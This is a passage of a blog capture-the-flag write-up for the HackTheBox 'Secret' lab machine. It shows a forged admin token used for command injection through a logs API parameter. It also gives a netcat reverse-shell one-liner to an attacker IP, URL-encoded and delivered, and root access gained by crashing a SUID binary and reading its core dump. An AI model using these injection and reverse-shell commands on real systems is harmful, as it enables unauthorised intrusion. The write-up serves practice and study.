</span></span></code></pre></div><p>Admin —ç—Å—ç—Ö —à–∞–ª–≥–∞—Ö:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://secret.htb/api/priv -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;creds&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;role&#34;</span>:<span style=color:#e6db74>&#34;admin&#34;</span>,<span style=color:#e6db74>&#34;username&#34;</span>:<span style=color:#e6db74>&#34;theadmin&#34;</span>,<span style=color:#e6db74>&#34;desc&#34;</span>:<span style=color:#e6db74>&#34;welcome back admin&#34;</span><span style=color:#f92672>}}</span>
</span></span></code></pre></div><p>Admin –º”©–Ω –±–∞–π—Å–∞–Ω. passwd <code>log?file=</code> –∞—à–∏–≥–ª–∞–Ω —à–∞–ª–≥–∞—Ö:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl <span style=color:#e6db74>&#39;http://secret.htb/api/logs?file=/etc/passwd&#39;</span> -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;killed&#34;</span>:false,<span style=color:#e6db74>&#34;code&#34;</span>:128,<span style=color:#e6db74>&#34;signal&#34;</span>:null,<span style=color:#e6db74>&#34;cmd&#34;</span>:<span style=color:#e6db74>&#34;git log --oneline /etc/passwd&#34;</span><span style=color:#f92672>}</span>‚îå
</span></span></code></pre></div><h3 id=5-exploitation>5. Exploitation<a hidden class=anchor aria-hidden=true href=#5-exploitation>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl <span style=color:#e6db74>&#39;http://secret.htb/api/logs?file=;id&#39;</span> -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>&#34;80bf34c fixed typos üéâ\n0c75212 now we can view logs from server üòÉ\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n&#34;</span>
</span></span></code></pre></div><p><code>dasith</code></p><p>curl via RCE payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 <span style=color:#ae81ff>9001</span> &gt;/tmp/f
</span></span></code></pre></div><p>CyperChef <code>URL Encoded</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E10%209001%20%3E%2Ftmp%2Ff
</span></span></code></pre></div><h4 id=51-reverse-shell>5.1 Reverse Shell<a hidden class=anchor aria-hidden=true href=#51-reverse-shell>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl <span style=color:#e6db74>&#39;http://secret.htb/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E10%209001%20%3E%2Ftmp%2Ff&#39;</span> -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBmNTZlMGFlMGM5NzA0NWU3MGQwMTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUxNzI2OTR9.9atPnYQ9Vorv3rT4p54ngJiypMXVQXayPLOOppuxA2o&#39;</span>
</span></span></code></pre></div><h4 id=52-shell-balance>5.2 Shell balance<a hidden class=anchor aria-hidden=true href=#52-shell-balance>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><p>ctrl+z</p><pre tabindex=0><code>stty raw -echo
</code></pre><p><code>f+g [enter enter]</code>
–±—É—Ü–∞–∞–¥ nc –æ—Ä–ª–æ–æ</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
</span></span></code></pre></div><h4 id=53-usertxt>5.3 user.txt<a hidden class=anchor aria-hidden=true href=#53-usertxt>#</a></h4><p>id:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>dasith<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>dasith<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>dasith<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>user.txt:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>762a20**********
</span></span></code></pre></div><h4 id=54-linpeassh>5.4 linpeas.sh`<a hidden class=anchor aria-hidden=true href=#54-linpeassh>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/tmp                                                                                                                          
</span></span><span style=display:flex><span>/tmp/crash-report                                                                                                             
</span></span><span style=display:flex><span>/tmp/crash-report/Architecture                                                                                                
</span></span><span style=display:flex><span>/tmp/crash-report/CoreDump                                                                                                    
</span></span><span style=display:flex><span>/tmp/crash-report/CoreDump/Architecture                                                                                       
</span></span><span style=display:flex><span>/tmp/crash-report/CoreDump/CoreDump                                                                                           
</span></span><span style=display:flex><span>/tmp/crash-report/CoreDump/Date                                                                                               
</span></span><span style=display:flex><span>/tmp/crash-report/CoreDump/DistroRelease                                                                                      
</span></span><span style=display:flex><span>/tmp/crash-report/CoreDump/ExecutablePath                                                                                     
</span></span><span style=display:flex><span><span style=color:#75715e>#)You_can_write_even_more_files_inside_last_directory                                                                         </span>
</span></span><span style=display:flex><span>                                                                                                                              
</span></span><span style=display:flex><span>/tmp/crash-report/CrashCounter                                                                                                
</span></span><span style=display:flex><span>/tmp/crash-report/Date                                                                                                        
</span></span><span style=display:flex><span>/tmp/crash-report/DistroRelease                                                                                               
</span></span><span style=display:flex><span>/tmp/crash-report/ExecutablePath                                                                                              
</span></span><span style=display:flex><span>/tmp/crash-report/ExecutableTimestamp                                                                                         
</span></span><span style=display:flex><span><span style=color:#75715e>#)You_can_write_even_more_files_inside_last_directory</span>
</span></span></code></pre></div><h3 id=6-enumeration>6. Enumeration<a hidden class=anchor aria-hidden=true href=#6-enumeration>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -type f -perm -u<span style=color:#f92672>=</span>s 2&gt;/dev/null
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cd /opt
</span></span></code></pre></div><p>Out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>2</span> root root  <span style=color:#ae81ff>4096</span> Oct  <span style=color:#ae81ff>7</span> 10:06 .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>20</span> root root  <span style=color:#ae81ff>4096</span> Oct  <span style=color:#ae81ff>7</span> 15:01 ..
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>3736</span> Oct  <span style=color:#ae81ff>7</span> 10:01 code.c
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>16384</span> Oct  <span style=color:#ae81ff>7</span> 10:01 .code.c.swp
</span></span><span style=display:flex><span>-rwsr-xr-x  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>17824</span> Oct  <span style=color:#ae81ff>7</span> 10:03 count
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>4622</span> Oct  <span style=color:#ae81ff>7</span> 10:04 valgrind.log
</span></span></code></pre></div><p><code>count</code>, <code>code.c</code></p><p>ssh keygen local –¥—ç—ç—Ä “Ø“Ø—Å–≥—ç–Ω—ç:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh-keygen -t rsa -b <span style=color:#ae81ff>4096</span> -C <span style=color:#e6db74>&#39;drt@htb&#39;</span> -f secret.htb -P <span style=color:#e6db74>&#39;&#39;</span>
</span></span></code></pre></div><p>secret.hub.pub</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh-rsa AAAAB3NzaC1yc2EAAAA********************xiPOw<span style=color:#f92672>==</span> ca@htb
</span></span></code></pre></div><p>—Ö—É—É–ª–∞—Ö auth_key (machine vm)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -i secret.htb dasith@10.10.11.120
</span></span></code></pre></div><p>—Ö–æ—ë—Ä ssh –Ω—ç—ç–Ω—ç</p><p>ssh 1:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dasith@secret:/opt$ ./count -p
</span></span><span style=display:flex><span>Enter source file/directory name: /root/root.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Total characters <span style=color:#f92672>=</span> <span style=color:#ae81ff>33</span>
</span></span><span style=display:flex><span>Total words      <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Total lines      <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Save results a file? <span style=color:#f92672>[</span>y/N<span style=color:#f92672>]</span>: y
</span></span><span style=display:flex><span>Path: 
</span></span></code></pre></div><p>ssh 2:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dasith@secret:/opt$ ps -aux | grep count
</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>824</span>  0.0  0.1 <span style=color:#ae81ff>235676</span>  <span style=color:#ae81ff>7472</span> ?        Ssl  Feb19   0:01 /usr/lib/accountsservice/accounts-daemon
</span></span><span style=display:flex><span>dasith      <span style=color:#ae81ff>3417</span>  0.0  0.0   <span style=color:#ae81ff>2488</span>   <span style=color:#ae81ff>576</span> pts/2    S+   Feb19   0:00 ./count
</span></span><span style=display:flex><span>dasith      <span style=color:#ae81ff>4596</span>  0.0  0.0   <span style=color:#ae81ff>2488</span>   <span style=color:#ae81ff>588</span> pts/4    S+   05:28   0:00 ./count -p
</span></span><span style=display:flex><span>dasith      <span style=color:#ae81ff>4606</span>  0.0  0.0   <span style=color:#ae81ff>6432</span>   <span style=color:#ae81ff>736</span> pts/5    S+   05:28   0:00 grep --color<span style=color:#f92672>=</span>auto count
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> kill -BUS <span style=color:#ae81ff>4596</span>
</span></span></code></pre></div><p><code>tmp</code> –¥–æ—Ç–æ—Ä caca –Ω—ç—Ä—Ç—ç–π —Ñ–æ–ª–¥–µ—Ä “Ø“Ø—Å–≥—ç—ç–¥ –¥–æ—Ç–æ—Ä –Ω—å unpack —Ö–∏–π–Ω—ç:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apport-unpack _opt_count.1000.crash /tmp/caca
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dasith@secret:/tmp/caca$ ls -la
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>444</span>
</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>2</span> dasith dasith   <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>20</span> 05:32 .
</span></span><span style=display:flex><span>drwxrwxrwt <span style=color:#ae81ff>15</span> root   root     <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>20</span> 05:32 ..
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith      <span style=color:#ae81ff>5</span> Feb <span style=color:#ae81ff>20</span> 05:32 Architecture
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith <span style=color:#ae81ff>380928</span> Feb <span style=color:#ae81ff>20</span> 05:32 CoreDump
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith      <span style=color:#ae81ff>1</span> Feb <span style=color:#ae81ff>20</span> 05:32 CrashCounter
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith     <span style=color:#ae81ff>24</span> Feb <span style=color:#ae81ff>20</span> 05:32 Date
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith     <span style=color:#ae81ff>12</span> Feb <span style=color:#ae81ff>20</span> 05:32 DistroRelease
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith     <span style=color:#ae81ff>10</span> Feb <span style=color:#ae81ff>20</span> 05:32 ExecutablePath
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith     <span style=color:#ae81ff>10</span> Feb <span style=color:#ae81ff>20</span> 05:32 ExecutableTimestamp
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith      <span style=color:#ae81ff>2</span> Feb <span style=color:#ae81ff>20</span> 05:32 _LogindSession
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith      <span style=color:#ae81ff>5</span> Feb <span style=color:#ae81ff>20</span> 05:32 ProblemType
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith      <span style=color:#ae81ff>7</span> Feb <span style=color:#ae81ff>20</span> 05:32 ProcCmdline
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith      <span style=color:#ae81ff>4</span> Feb <span style=color:#ae81ff>20</span> 05:32 ProcCwd
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith     <span style=color:#ae81ff>97</span> Feb <span style=color:#ae81ff>20</span> 05:32 ProcEnviron
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith   <span style=color:#ae81ff>2144</span> Feb <span style=color:#ae81ff>20</span> 05:32 ProcMaps
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith   <span style=color:#ae81ff>1335</span> Feb <span style=color:#ae81ff>20</span> 05:32 ProcStatus
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith      <span style=color:#ae81ff>2</span> Feb <span style=color:#ae81ff>20</span> 05:32 Signal
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith     <span style=color:#ae81ff>29</span> Feb <span style=color:#ae81ff>20</span> 05:32 Uname
</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> dasith dasith      <span style=color:#ae81ff>3</span> Feb <span style=color:#ae81ff>20</span> 05:32 UserGroups
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>strings CoreDump
</span></span></code></pre></div><p>Root.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>8599fb*********
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="—Ö—É—É–ª–∞—Ö";function s(){t.innerHTML="—Ö—É—É–ª—Å–∞–Ω!",setTimeout(()=>{t.innerHTML="—Ö—É—É–ª–∞—Ö"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>